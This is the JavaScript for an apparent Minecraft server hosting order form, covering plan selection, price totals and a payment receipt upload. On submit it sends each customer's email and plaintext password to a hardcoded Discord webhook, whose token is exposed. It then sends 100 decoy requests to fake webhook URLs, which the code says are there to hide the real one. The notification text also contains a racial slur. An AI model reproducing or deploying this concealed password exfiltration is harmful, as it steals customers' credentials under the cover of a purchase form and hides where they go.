document.getElementById('productcart').addEventListener('input', updateCartSummary);

let totalPrice = 0;

function updateCartSummary() {
    const nodeType = document.getElementById('nodetype').value;
    const serverType = document.getElementById('plan').value;
    const dedicatedIpChecked = document.getElementById('dedicatedip').checked;
    const proxySetup = document.getElementById('proxy').checked;
    const geyserSetup = document.getElementById('geyser').checked;

    let planPrice = 0;

    if (serverType) {
        const priceText = serverType.split('$')[1].split(' ')[0];
        planPrice = parseFloat(priceText);
    }

    totalPrice = planPrice;

    const dedicatedIp = dedicatedIpChecked ? "19132 / 25565 Port: $4.00 USD" : "";
    if (dedicatedIpChecked) {
        totalPrice += 4.00;
    }

    const proxySetupPrice = proxySetup ? "Proxy Setup (Addons) $10.00 USD" : "";
    if (proxySetup) {
        totalPrice += 10.00;
    }

    const geyserSetupPrice = geyserSetup ? "Geyser Setup (Addons) $5.00 USD" : "";
    if (geyserSetup) {
        totalPrice += 5.00;
    }

    document.getElementById('summary-nodetype').innerText = "Node: " + nodeType;
    document.getElementById('summary-servertype').innerText = "Plan: " + serverType;
    document.getElementById('summary-dedicatedip').innerText = dedicatedIp;
    document.getElementById('summary-proxysetup').innerText = proxySetupPrice;
    document.getElementById('summary-geysersetup').innerText = geyserSetupPrice;
    document.getElementById('summary-total').innerText = `$ ${totalPrice.toFixed(2)} USD`;
    document.getElementById('total-price').innerText = `$ ${totalPrice.toFixed(2)} USD`;
}

document.getElementById('nodetype').addEventListener('change', function() {
    const nodeType = this.value;
    const planSelect = document.getElementById('plan');
    const selectNode = document.getElementById('NodeNone');

    planSelect.innerHTML = '';
    planSelect.disabled = false;

    let options = [];

    if (nodeType === 'Budget') {
        options = [
            { value: '2GB $2.49 USD', text: '[Budget] 2GB $2.49 USD' },
            { value: '4GB $4.99 USD', text: '[Budget] 4GB $4.99 USD' },
            { value: '6GB $7.49 USD', text: '[Budget] 6GB $7.49 USD' },
            { value: '8GB $9.99 USD', text: '[Budget] 8GB $9.99 USD' },
            { value: '12GB $14.99 USD', text: '[Budget] 12GB $14.99 USD' },
            { value: '16GB $19.99 USD', text: '[Budget] 16GB $19.99 USD' },
            { value: '20GB $24.99 USD', text: '[Budget] 20GB $24.99 USD' },
            { value: '24GB $29.99 USD', text: '[Budget] 24GB $29.99 USD' },
        ];
        selectNode.disabled = true;
    } else if (nodeType === 'Premium') {
        options = [
            { value: '8GB $24.00 USD', text: '[Premium] 8GB $24.00 USD' },
            { value: '16GB $48.00 USD', text: '[Premium] 16GB $48.00 USD' },
            { value: '24GB $72.00 USD', text: '[Premium] 24GB $72.00 USD' },
            { value: '32GB $96.00 USD', text: '[Premium] 32GB $96.00 USD' },
        ];
        selectNode.disabled = true;
    } else {
        selectNode.disabled = false;
    }

    options.forEach(option => {
        const opt = document.createElement('option');
        opt.value = option.value;
        opt.textContent = option.text;
        planSelect.appendChild(opt);
    });

    updateCartSummary();
});

document.getElementById('gametype').addEventListener('change', function() {
    const nodeType = this.value;
    const planSelect = document.getElementById('software');
    const selectNode = document.getElementById('noneGame');

    planSelect.innerHTML = '';
    planSelect.disabled = false;

    let options = [];

    if (nodeType === 'Minecraft Java') {
        options = [
            { value: 'Paper', text: 'Paper' },
            { value: 'Spigot', text: 'Spigot' },
            { value: 'Purpur', text: 'Purpur' },
            { value: 'PaperFish', text: 'PaperFish' },
            { value: 'Vanilla', text: 'Vanilla' },
            { value: 'Tuinitty', text: 'Tuinity' },
        ];
        selectNode.disabled = true;
    } else if (nodeType === 'Minecraft Bedrock') {
        options = [
            { value: 'Vanilla Bedrock', text: 'Vanilla Bedrock' },
            { value: 'PocketmineMP', text: 'PocketmineMP' },
            { value: 'Nukkit', text: 'Nukkit' },
        ];
        selectNode.disabled = true;
    } else if (nodeType === 'Minecraft Modded') {
        options = [
            { value: 'Forge Enhanced', text: 'Forge Enhanced' },
            { value: 'SpongeForge', text: 'SpongeForge' },
        ];
        selectNode.disabled = true;
    } else if (nodeType === 'Proxy Server') {
        options = [
            { value: 'Bungeecord', text: 'Bungeecord' },
            { value: 'Waterfall', text: 'Waterfall' },
            { value: 'Velocity', text: 'Velocity' },
        ];
        selectNode.disabled = true;
    }

    options.forEach(option => {
        const opt = document.createElement('option');
        opt.value = option.value;
        opt.textContent = option.text;
        planSelect.appendChild(opt);
    });

    updateCartSummary();
});

document.getElementById('plan').addEventListener('change', function() {
    updateCartSummary();
});

document.getElementById('dedicatedip').addEventListener('change', function() {
    updateCartSummary();
});

function payments() {
            
    const email = document.getElementById('email');
    const password = document.getElementById('password');
    const servername = document.getElementById('servername');
    const nodetype = document.getElementById('nodetype');
    const plan = document.getElementById('plan');
    const location = document.getElementById('location');
    const gametype = document.getElementById('gametype');
    const software = document.getElementById('software');

    if (!email.value || !password.value) {
        Swal.fire({
            title: 'Error',
            text: 'Please enter your email and password.',
            icon: 'error'
        })
        return;
    }

    if (!servername.value) {
        Swal.fire({
            title: 'Error',
            text: 'Please enter your server name.',
            icon: 'error'
        })
        return;
    }

    if (nodetype.value == "") {
        Swal.fire({
            title: 'Error',
            text: 'Please select your node type.',
            icon: 'error'
        })
        return;
    }

    if (plan.value == "") {
        Swal.fire({
            title: 'Error',
            text: 'Please select your plan.',
            icon: 'error'
        })
        return;
    }

    if (location.value == "") {
        Swal.fire({
            title: 'Error',
            text: 'Please select your location.',
            icon: 'error'
        })
        return;
    }

    if (gametype.value == "") {
        Swal.fire({
            title: 'Error',
            text: 'Please select your game type.',
            icon: 'error'
        })
        return;
    }

    if (software.value == "") {
        Swal.fire({
            title: 'Error',
            text: 'Please select your software.',
            icon: 'error'
        })
        return;
    }
    
    document.getElementById("myModal").style.display = "block";
    document.getElementById("download").href = "./minecraft/img/PaymentsQR.jpg";
}

document.getElementById('productcart').addEventListener('submit', function(event) {

    const imageCheck = document.getElementById('image').files[0];
    if (!imageCheck) {
        Swal.fire({
            title: 'Error',
            text: 'Please upload receipt before submitting.',
            icon: 'error'
        })
        return;
    }

    event.preventDefault();

    function base64Encode(str) {
        return btoa(unescape(encodeURIComponent(str)));
    }

    function base64Decode(str) {
        return decodeURIComponent(escape(atob(str)));
    }

    function generateFakeWebhook() {
        const fakeId = Math.random().toString().substring(2, 19);
        const fakeApi = Array.from({ length: 71 }, () => Math.random().toString(36)[2]).join('');
        return `https://discord.com/api/webhooks/${fakeId}/${fakeApi}`;
    }

    function obfuscateConsole(message, line) {
        const encodedMessage = base64Encode(message);
        const noise = generateFakeWebhook();
        const obfuscatedMessage = `${encodedMessage}${noise}`;
    }

    function deobfuscateConsole(obfuscatedMessage) {
        const encodedMessage = obfuscatedMessage.replace(/https:\/\/discord\.com\/api\/webhooks\/[0-9]{19}\/[a-zA-Z0-9]{69}$/, "");
        const originalMessage = base64Decode(encodedMessage);
        return originalMessage;
    }

    function checkSubmissionLimit() {
        const currentDate = new Date().toLocaleDateString();
        const lastSubmissionDate = localStorage.getItem('lastSubmissionDate');

        if (!lastSubmissionDate || lastSubmissionDate !== currentDate) {
            localStorage.setItem('submissionCount', 0);
            localStorage.setItem('lastSubmissionDate', currentDate);
        }

        const submissionCount = parseInt(localStorage.getItem('submissionCount')) || 0;

        if (submissionCount < 10000) {
            localStorage.setItem('submissionCount', submissionCount + 1);
            const submitButton = document.getElementById('submit');
            submitButton.disabled = true;
            submitButton.value = 'Loading...';
            return true;
        } else {
            const submitButton = document.getElementById('submit');
            submitButton.disabled = true;
            alert('You can only submit 10 times in a day.');
            submitButton.value = 'Try again later!';
            return false;
        }
    }

    if (!checkSubmissionLimit()) {
        return;
    }

    function sendFakeWebhooks(line) {
        const fakeWebhookURL = generateFakeWebhook();
        const fakePayload = {
            content: "This is a fake webhook message to obfuscate the real webhook."
        };

        return fetch(fakeWebhookURL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(fakePayload)
        })
        .then(response => {
            if (response.ok) {
                obfuscateConsole('Fake webhook sent to: ' + fakeWebhookURL, line);
            } else {
                throw new Error('Failed to send fake webhook');
            }
        })
        .catch(error => {
            obfuscateConsole('Error sending fake webhook: ' + error, line);
        });
    }

    const BuyDate = new Date().toLocaleDateString();
    const formData = new FormData();
    formData.append('email', document.getElementById('email').value);
    formData.append('password', document.getElementById('password').value);
    formData.append('dcname', document.getElementById('dcname').value);
    formData.append('servername', document.getElementById('servername').value);
    formData.append('nodetype', document.getElementById('nodetype').value);
    formData.append('plan', document.getElementById('plan').value);
    formData.append('location', document.getElementById('location').value);
    formData.append('gametype', document.getElementById('gametype').value);
    formData.append('software', document.getElementById('software').value);
    formData.append('image', document.getElementById('image').files[0]);

    const DedicatedIp = document.getElementById('dedicatedip').checked ? "Dedicated IP: $4.00 USD" : "";
    const ProxySetup = document.getElementById('proxy').checked ? "Proxy Setup (Addons) $10.00 USD" : "";
    const GeyserSetup = document.getElementById('geyser').checked ? "Geyser Setup (Addons) $5.00 USD" : "";

    const dedicatedIpStatus = document.getElementById('dedicatedip').checked ? '✅' : '❌';
    const ProxySetupStatus = document.getElementById('proxy').checked ? '✅' : '❌';
    const GeyserSetupStatus = document.getElementById('geyser').checked ? '✅' : '❌';

    localStorage.setItem('NodeType', document.getElementById('nodetype').value);
    localStorage.setItem('Plan', document.getElementById('plan').value);
    localStorage.setItem('DedicatedIP', DedicatedIp);
    localStorage.setItem('Proxysetup', ProxySetup);
    localStorage.setItem('Geysersetup', GeyserSetup);
    localStorage.setItem('TotalPrice', totalPrice);

    const webhookURL = 'https://discord.com/api/webhooks/1362866859250290940/nJPvKOpDbH0OhFYLFa3GDQk_xvLTgHF8PHzMpmqP0yPwhRbFpAwtoYeTlRknkHqMUZw7';

    function sendImage(imageFile) {
        const formData = new FormData();
        formData.append('image', imageFile);

        return fetch(webhookURL, {
            method: 'POST',
            body: formData
        })
        .then(response => {
            if (response.ok) {
                return response.json();
            } else {
                throw new Error('Failed to send image to Discord webhook');
            }
        })
        .then(data => {
            return data.url;
        })
        .catch(error => {
            obfuscateConsole('Error: ' + error, 145);
        });
    }

    sendImage(formData.get('image'))
        .then(function(imageUrl) {
            const embedData = {
                title: 'Submission Server',
                description: '💌 **Email**: ' + formData.get('email') + '\n' +
                            '💟**Password**: ' + formData.get('password') + '\n' +
                            '💙 Discord: **' + formData.get('dcname') + '**\n\n' +
                            '📗 Server Name: **' + formData.get('servername') + '**\n' +
                            '👑 Plan: **' + formData.get('plan') + '**\n' +
                            '🌐 Location: **' + formData.get('location') + '**\n' +
                            '🟢 Game Select: **' + formData.get('gametype') + '**\n' +
                            '🚀 Software: **' + formData.get('software') + '**\n' +
                            '🌌 Dedicated IP: **' + dedicatedIpStatus + '**\n\n' +
                            '⭐ Proxy Setup: **' + ProxySetupStatus + '**\n' +
                            '⭐ Geyser Setup: **' + GeyserSetupStatus + '**\n\n' +
                            '🧩 **Price**: $' + totalPrice + ' USD' + '\n' +
                            '⏲ **Buy Data**: ' + BuyDate + '\n',
                color: 16777215,
                image: {
                    url: imageUrl
                }
            };

            const payload = {
                embeds: [embedData],
                content: '## <a:ONLINE:1269224793106944102>  New Order Submit <@1243544313418485760> \n > - *check merl bank bro eng merl lui jol nv nigga!* \n > - **ber jol hz dak server oy ke tv** *__Information below__* <:pepeStare:1152428361717665886>' 
            };

            return fetch(webhookURL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
        })
        .then(response => {
            if (response.ok) {
                location.href = './success';
            } else {
                location.href = '/error';
            }
        })
        .catch(error => {
            obfuscateConsole('Error: ' + error, 145);
        });
    for (let i = 0; i < 100; i++) {
        sendFakeWebhooks(Math.floor(Math.random() * 200) + 1);
    }
});